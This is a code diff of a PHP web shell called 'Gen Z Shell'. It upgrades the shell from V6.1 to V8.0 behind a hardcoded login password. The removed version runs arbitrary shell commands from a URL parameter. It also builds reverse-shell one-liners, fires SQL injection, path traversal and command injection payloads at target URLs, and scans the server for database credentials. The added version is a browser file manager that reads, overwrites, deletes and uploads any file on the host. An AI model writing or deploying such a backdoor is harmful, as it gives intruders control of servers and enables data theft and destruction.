@@ -1,235 +1,191 @@
 <?php
 session_start();
-
-// -------------------- CONFIG --------------------
 $password = 'genz123';
 
-// -------------------- AUTH --------------------
 if (!isset($_SESSION['auth'])) {
     if (isset($_POST['pass']) && $_POST['pass'] === $password) {
         $_SESSION['auth'] = true;
     } else {
-        loginPage();
+        echo <<<HTML
+        <html><body style="background:#111;color:#fff;text-align:center;margin-top:20%;">
+        <h1>🔥 Gen Z Shell Login 🔥</h1>
+        <form method="post">
+        <input type="password" name="pass" placeholder="Password" style="padding:10px;border-radius:5px;"><br><br>
+        <button type="submit" style="padding:10px 30px;">Enter</button>
+        </form></body></html>
+        HTML;
         exit;
     }
-}
-
-function loginPage() {
-    echo <<<HTML
-    <html><body style="background:#111;color:#fff;text-align:center;margin-top:20%;">
-    <h1>🔥 Gen Z Shell Login 🔥</h1>
-    <form method="post">
-    <input type="password" name="pass" placeholder="Password" style="padding:10px;border-radius:5px;"><br><br>
-    <button type="submit" style="padding:10px 30px;">Enter</button>
-    </form></body></html>
-    HTML;
 }
 
 error_reporting(0);
 set_time_limit(0);
 
-// -------------------- CORE --------------------
-$baseDir = "/";
-$cwd = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
-if (strpos($cwd, $baseDir) !== 0) $cwd = $baseDir;
-
-// Command Execution
-if (isset($_GET['cmd'])) {
-    chdir($cwd);
-    $output = shell_exec($_GET['cmd'] . " 2>&1");
-}
-
-// File Upload
-if (isset($_FILES['file'])) {
-    move_uploaded_file($_FILES['file']['tmp_name'], $cwd . "/" . $_FILES['file']['name']);
-}
-
-// File Editor
-if (isset($_POST['editfile']) && isset($_POST['content'])) {
-    file_put_contents($_POST['editfile'], $_POST['content']);
-}
-
-// Change Permission
-if (isset($_POST['chmodfile'], $_POST['chmodvalue'])) {
-    chmod($_POST['chmodfile'], octdec($_POST['chmodvalue']));
-}
-
-// Mini WAF Bypass Tester
-function wafTest($url, $payloads) {
-    $results = [];
-    foreach ($payloads as $p) {
-        $ch = curl_init($url . $p);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $resp = curl_exec($ch);
-        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        $results[] = "$p => HTTP: $http";
-        curl_close($ch);
-    }
-    return $results;
-}
-
-// Reverse Shell Generator
-function reverseShellCode($ip, $port) {
-    return "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
-}
-
-// Shell Detector
-function scanShells($dir) {
-    $found = [];
-    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
-    foreach ($iterator as $file) {
-        if (pathinfo($file, PATHINFO_EXTENSION) !== 'php') continue;
-        $content = file_get_contents($file);
-        if (preg_match('/(base64_decode|gzinflate|shell_exec|eval|assert|system|passthru|`)/i', $content)) {
-            $found[] = $file;
+// API HANDLER
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    if (isset($_GET['list'])) {
+        $dir = realpath($_GET['list']) ?: '/';
+        $parent = ($dir != '/') ? dirname($dir) : null;
+        $files = [];
+        foreach (scandir($dir) as $f) {
+            if ($f === ".") continue;
+            $files[] = [
+                'name' => $f,
+                'path' => $dir . '/' . $f,
+                'type' => is_dir($dir . '/' . $f) ? 'DIR' : 'FILE'
+            ];
         }
+        echo json_encode(['dir' => $dir, 'parent' => $parent, 'files' => $files]);
+        exit;
     }
-    return $found;
+    if (isset($_GET['read'])) {
+        echo @file_get_contents($_GET['read']);
+        exit;
+    }
 }
 
-// Credentials Scanner
-function scanCreds($dir) {
-    $found = [];
-    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
-    foreach ($iterator as $file) {
-        if (!in_array(pathinfo($file, PATHINFO_EXTENSION), ['php','env','ini','json','yaml','yml'])) continue;
-        $content = file_get_contents($file);
-        if (preg_match('/(DB_PASSWORD|DB_USER|DB_HOST|DB_NAME|password\s*=\s*|user\s*=\s*|root|mysql)/i', $content)) {
-            $found[] = $file;
-        }
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['save'], $_POST['content'])) {
+        file_put_contents($_POST['save'], $_POST['content']);
     }
-    return $found;
+    if (isset($_POST['rename'], $_POST['newname'])) {
+        rename($_POST['rename'], $_POST['newname']);
+    }
+    if (isset($_POST['delete'])) {
+        is_dir($_POST['delete']) ? rmdir($_POST['delete']) : unlink($_POST['delete']);
+    }
+    if (isset($_POST['mkdir'])) {
+        mkdir($_POST['mkdir']);
+    }
+    if (isset($_POST['create'])) {
+        touch($_POST['create']);
+    }
+    if (isset($_FILES['upload'])) {
+        move_uploaded_file($_FILES['upload']['tmp_name'], $_POST['path'].'/'.$_FILES['upload']['name']);
+    }
+    exit;
 }
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-<title>Gen Z Shell V6.1 🔥</title>
+<title>Gen Z Shell V8.0 PRO+ (Single File)</title>
 <style>
-body { background:#111; color:#eee; font-family:Consolas, monospace; margin:0; }
-a { color:#6cf; text-decoration:none; }
-a:hover { text-decoration:underline; }
+body { background:#111; color:#eee; font-family:Consolas, monospace; margin:0; padding:20px; }
 h1 { color:#f55; }
 input,button,textarea { padding:5px 10px; margin:5px; border-radius:5px; }
-pre { background:#222; padding:10px; overflow:auto; }
-.sidebar { 
-    position:fixed; 
-    top:0; 
-    left:0; 
-    bottom:0; 
-    width:260px; 
-    background:#000; 
-    padding:20px; 
-    border-right:2px solid #333; 
-    overflow-y:auto; 
-    height:100vh;
-}
-.content { margin-left:280px; padding:20px; }
-.file-item { display:flex; justify-content:space-between; align-items:center; margin-bottom:5px; }
-.file-name { flex:1; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; }
+table { width:100%; border-collapse:collapse; margin-top:20px; }
+th,td { border:1px solid #333; padding:8px 12px; text-align:left; }
+th { background:#222; }
+a { color:#6cf; text-decoration:none; }
+a:hover { text-decoration:underline; }
+.dir-container { max-height:500px; overflow:auto; border:1px solid #333; margin-top:20px; }
 </style>
 </head>
 <body>
 
-<div class="sidebar">
-    <h1>🔥 Gen Z V6.1</h1>
-    <p><b>Current Dir:</b> <?php echo htmlspecialchars($cwd); ?></p>
-    <p><a href="?">Home</a></p>
-    <ul style="list-style:none;padding:0;">
-    <?php
-    $files = @scandir($cwd);
-    if ($cwd != $baseDir) {
-        echo "<li><a href='?dir=" . urlencode(dirname($cwd)) . "'>⬅️ Parent</a></li>";
-    }
-    foreach ($files as $f) {
-        if ($f === ".") continue;
-        $path = $cwd . DIRECTORY_SEPARATOR . $f;
-        $link = "?dir=" . urlencode($path);
-        echo "<li class='file-item'>". (is_dir($path) ? "📂" : "📄") ." <a class='file-name' href='$link'>$f</a></li>";
-    }
-    ?>
-    </ul>
+<h1>🔥 Gen Z Shell V8.0 PRO+ (Single File)</h1>
+<p><b>Current Dir:</b> <span id="currentPath">/</span></p>
+
+<div>
+    <button onclick="newFolder()">+ Folder</button>
+    <button onclick="newFile()">+ File</button>
+    <input type="file" id="upload" onchange="uploadFile(this.files)">
 </div>
 
-<div class="content">
-<h2>💻 Command Execution</h2>
-<form>
-    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($cwd); ?>">
-    <input type="text" name="cmd" style="width:400px;" placeholder="ls -la">
-    <button>Run</button>
-</form>
-<?php if(isset($output)) echo "<pre>$output</pre>"; ?>
-
-<h2>📤 File Upload</h2>
-<form method="post" enctype="multipart/form-data">
-    <input type="file" name="file">
-    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($cwd); ?>">
-    <button>Upload</button>
-</form>
-
-<h2>🔐 Change Permission</h2>
-<form method="post">
-    File: <input type="text" name="chmodfile" value="<?php echo htmlspecialchars($cwd); ?>" style="width:300px;">
-    Chmod: <input type="text" name="chmodvalue" value="0755" style="width:80px;">
-    <button>Change</button>
-</form>
-
-<h2>📝 File Editor</h2>
-<?php 
-if (is_file($cwd)) {
-    $content = htmlspecialchars(file_get_contents($cwd));
-    echo "<form method='post'><textarea name='content' rows='20' cols='80'>$content</textarea><br>
-    <input type='hidden' name='editfile' value='".htmlspecialchars($cwd)."'>
-    <button>Save</button></form>";
-} else {
-    echo "Select a file to edit.";
-}
-?>
-
-<h2>🧪 Mini WAF Bypass Tester</h2>
-<form method="post">
-<input type="text" name="url" placeholder="Target URL" size="50">
-<button>Test</button>
-</form>
-<?php
-if (isset($_POST['url'])) {
-    $payloads = ["' OR 1=1 -- ", "'; DROP TABLE users; --", "../../../../etc/passwd", "<?php phpinfo();?>", "id;uname -a"];
-    $results = wafTest($_POST['url'], $payloads);
-    echo "<pre>".implode("\n",$results)."</pre>";
-}
-?>
-
-<h2>📡 Reverse Shell Generator</h2>
-<form method="post">
-IP: <input type="text" name="rip" value="127.0.0.1">
-Port: <input type="text" name="rport" value="9001">
-<button>Generate</button>
-</form>
-<?php
-if (isset($_POST['rip'],$_POST['rport'])) {
-    echo "<pre>".reverseShellCode($_POST['rip'],$_POST['rport'])."</pre>";
-}
-?>
-
-<h2>🔎 Shell Scanner</h2>
-<?php
-$shells = scanShells("/");
-if ($shells) {
-    echo "<pre>".implode("\n",$shells)."</pre>";
-} else {
-    echo "✅ No suspicious shell found.";
-}
-?>
-
-<h2>🔑 Credentials Scanner</h2>
-<?php
-$creds = scanCreds("/");
-if ($creds) {
-    echo "<pre>".implode("\n",$creds)."</pre>";
-} else {
-    echo "✅ No credentials found.";
-}
-?>
+<div class="dir-container">
+<table id="fileTable">
+<tr><th>Name</th><th>Type</th><th>Action</th></tr>
+</table>
 </div>
+
+<h2>📝 Editor</h2>
+<textarea id="editor" rows="20" cols="100"></textarea><br>
+<button onclick="saveFile()">💾 Save</button>
+
+<script>
+let currentDir = '/';
+loadFiles(currentDir);
+
+function loadFiles(dir) {
+    fetch('?list=' + encodeURIComponent(dir))
+    .then(res => res.json())
+    .then(data => {
+        currentDir = data.dir;
+        document.getElementById('currentPath').innerText = currentDir;
+        let table = document.getElementById('fileTable');
+        table.innerHTML = '<tr><th>Name</th><th>Type</th><th>Action</th></tr>';
+        if (data.parent) {
+            table.innerHTML += `<tr><td><a href="#" onclick="loadFiles('${data.parent}')">⬅️ Parent</a></td><td>DIR</td><td></td></tr>`;
+        }
+        data.files.forEach(f => {
+            let action = (f.type === 'FILE') 
+                ? `<a href="#" onclick="editFile('${f.name}')">Edit</a> | ` 
+                : '';
+            action += `<a href="#" onclick="renameFile('${f.name}')">Rename</a> | <a href="#" onclick="deleteFile('${f.name}')">Delete</a>`;
+            table.innerHTML += `<tr><td><a href="#" onclick="loadFiles('${f.path}')">${f.name}</a></td><td>${f.type}</td><td>${action}</td></tr>`;
+        });
+    });
+}
+
+function editFile(name) {
+    fetch('?read=' + encodeURIComponent(currentDir + '/' + name))
+    .then(res => res.text())
+    .then(data => document.getElementById('editor').value = data);
+}
+
+function saveFile() {
+    let content = document.getElementById('editor').value;
+    let file = prompt("Save as (relative path):", "");
+    if (!file) return;
+    fetch('', {
+        method: 'POST',
+        body: new URLSearchParams({save: currentDir + '/' + file, content: content})
+    }).then(() => loadFiles(currentDir));
+}
+
+function renameFile(name) {
+    let newName = prompt("Rename to:", name);
+    if (!newName) return;
+    fetch('', {
+        method: 'POST',
+        body: new URLSearchParams({rename: currentDir + '/' + name, newname: currentDir + '/' + newName})
+    }).then(() => loadFiles(currentDir));
+}
+
+function deleteFile(name) {
+    if (!confirm("Delete " + name + "?")) return;
+    fetch('', {
+        method: 'POST',
+        body: new URLSearchParams({delete: currentDir + '/' + name})
+    }).then(() => loadFiles(currentDir));
+}
+
+function newFolder() {
+    let name = prompt("Folder name:");
+    if (!name) return;
+    fetch('', {
+        method: 'POST',
+        body: new URLSearchParams({mkdir: currentDir + '/' + name})
+    }).then(() => loadFiles(currentDir));
+}
+
+function newFile() {
+    let name = prompt("File name:");
+    if (!name) return;
+    fetch('', {
+        method: 'POST',
+        body: new URLSearchParams({create: currentDir + '/' + name})
+    }).then(() => loadFiles(currentDir));
+}
+
+function uploadFile(files) {
+    let form = new FormData();
+    form.append("upload", files[0]);
+    form.append("path", currentDir);
+    fetch('', { method: 'POST', body: form })
+    .then(() => loadFiles(currentDir));
+}
+</script>
 </body>
 </html>
